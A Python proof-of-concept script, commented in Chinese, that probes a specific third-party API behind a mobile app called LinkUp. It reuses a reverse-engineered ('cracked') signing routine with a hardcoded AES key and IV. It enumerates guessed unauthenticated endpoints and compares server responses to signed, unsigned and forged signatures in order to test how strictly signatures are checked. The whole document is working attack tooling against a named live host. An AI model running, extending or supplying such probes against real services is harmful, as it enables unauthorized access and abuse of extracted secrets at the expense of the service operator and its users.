"""
LinkUp 主域 https://dmp.51wnl-cq.com 接口 PoC 探查器
- 复用已破解的 signatureGet
- 探测一组"可能未登录可达"的低风险接口
- 同时对比"未签名 / 签名 / 错签"三种状态，看服务端校验严格度
- 不发送任何写操作（无创建好友/上传位置/支付）
"""
import hashlib
import json
import time
from urllib.parse import urlencode

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BASE = "https://dmp.51wnl-cq.com"
TEST_BASE = "https://dmp-test.51wnl-cq.com"
KEY = b"be2524844ec4bb25"
IV  = b"be2524844ec4bb25"

# Android 用户代理（与 LinkUp 实际 UA 接近）
UA = "okhttp/4.9.3"

def aes128(s: str) -> str:
    c = AES.new(KEY, AES.MODE_CBC, IV)
    return c.encrypt(pad(s.encode("utf-8"), 16)).hex()

def md5(s: str) -> str:
    return hashlib.md5(s.encode("utf-8")).hexdigest()

def sign(sign_input: str) -> str:
    return md5(aes128(sign_input))

# 与 OkHttpManager.getAsync 完全一致的签名输入：path + "?" + sorted querystring
def sign_for_get(path: str, params: dict) -> tuple[str, str, str]:
    """返回 (full_url_no_host, qs_string, signature)
    OkHttpManager.mapToGet 是 dict 顺序，Java HashMap 没有保证顺序但 Kotlin LinkedHashMap 保留插入序。
    这里用 params 的迭代序，不做 sort 以贴合实现。"""
    if not params:
        qs = ""
        sign_input = path + "?"  # mapToGet 总会拼一个 "?" 然后 trim 末尾 "&"，空 params 会留 "?"
    else:
        qs = "&".join(f"{k}={v if v is not None else ''}" for k, v in params.items())
        sign_input = f"{path}?{qs}"
    return sign_input, qs, sign(sign_input)

def call_get(host: str, path: str, params: dict, *, omit_sign=False, bad_sign=False, timeout=8):
    sign_input, qs, sg = sign_for_get(path, params)
    url = host + path + (("?" + qs) if qs else "")
    headers = {
        "Accept": "application/x-protobuf",
        "User-Agent": UA,
        "origin": "ANDROID_SDK",
    }
    if not omit_sign:
        headers["Signature"] = (sg[::-1] if bad_sign else sg)
    try:
        r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        body = r.content[:200]
        return r.status_code, dict(r.headers), body, sign_input
    except Exception as e:
        return None, None, f"ERR {e}".encode(), sign_input

# 候选未登录可达路径（从 SDK 命名习惯 + dmp.* 性质 + yftracker 上报常见路径推断）
PATHS = [
    "/",
    "/api/v1/version",
    "/api/v1/version/check",
    "/api/v1/sdk/init",
    "/api/v1/config/getconfigs",
    "/api/config/getconfigs",
    "/api/sdk/init",
    "/api/sdk/active",
    "/api/v1/sdk/active",
    "/api/v1/heartbeat",
    "/api/v1/auth/sts",
    "/api/v1/sts/auth",
    "/api/v1/track/init",
    # yftracker 风格
    "/yftracker/v1/init",
    "/yftracker/init",
    # health/probe
    "/health",
    "/ping",
    "/status",
]

PARAMS_COMMON = {
    "app_id": "linkup",
    "platform": "android",
    "version": "1.5.5",
    "channel": "default",
    "ts": str(int(time.time())),
}

def main():
    print(f"BASE = {BASE}")
    print(f"KEY  = {KEY!r}    IV = {IV!r}")
    print(f"PROBE PATHS = {len(PATHS)}")
    print()
    print(f"{'path':<32} {'mode':<10} {'status':<6} {'len':<5} {'body[:80]'}")
    print("-" * 110)

    interesting = []
    for path in PATHS:
        for mode in ("signed", "no-sign", "bad-sign"):
            kwargs = {"omit_sign": mode == "no-sign", "bad_sign": mode == "bad-sign"}
            st, hd, body, si = call_get(BASE, path, PARAMS_COMMON, **kwargs)
            blen = len(body) if body else 0
            print(f"{path:<32} {mode:<10} {str(st):<6} {blen:<5} {body[:80]!r}")
            if st and st not in (404, 403, 502, 503, 504, None):
                interesting.append((path, mode, st, hd, body, si))
        print()
        time.sleep(0.05)

    print("\n=== 有响应（非 4xx/5xx 通用错误）接口汇总 ===")
    for path, mode, st, hd, body, si in interesting:
        print(f"  {path}  [{mode}]  status={st}  sign_input={si!r}")
        # 输出 Server / 关键 header
        if hd:
            for k in ("Server", "Content-Type", "X-Reqid", "X-Trace-Id"):
                if k in hd: print(f"    {k}: {hd[k]}")
        print(f"    body: {body[:200]!r}")

if __name__ == "__main__":
    main()
